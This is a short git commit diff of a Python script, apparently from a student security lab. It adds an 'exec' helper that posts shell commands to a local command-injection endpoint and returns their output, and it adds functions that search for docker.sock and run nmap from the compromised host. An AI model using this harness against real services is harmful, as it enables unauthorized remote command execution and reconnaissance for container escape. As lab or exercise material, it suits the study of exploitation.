86470fd10c6d01e927d91beae157b6662cbd873b
Miro Gaonac'h-Lovejoy <miro.gaonach-lovejoy.1@ens.etsmtl.ca>
2023-02-12 18:15:24 -0500

    First couple general use functions including nmap scan capability

--- main.py
+++ main.py
@@ -1,5 +1,24 @@
-from requests2 import http_legit
+import sys
+import requests
+import pwn
 
-r = http_legit.do_http_basic("http://10.0.2.4/")
+def exec(command: str) -> tuple[str, str]:
+    """Executes the given command on the remote machine."""
+    headers = {'Content-Type': 'text/plain'}
+    response = requests.post('http://localhost:8080/api/user/command-injection', headers=headers, data=command)
+    body = response.json()
 
-print(r)
+    if 'err' in body:
+        print(body)
+        raise Exception(body['err'])
+
+    return body['stdout'], body['stderr']
+
+def checkDocker():
+    for path in ['/var', '/host/var']:
+        print(exec(f"find {pwn.sh_string(path)} -type f -name docker.sock"))
+
+def nmapScan(ipAddr):
+    exec(f"nmap {ipAddr}")
+
+#if __name__ == "__main__":
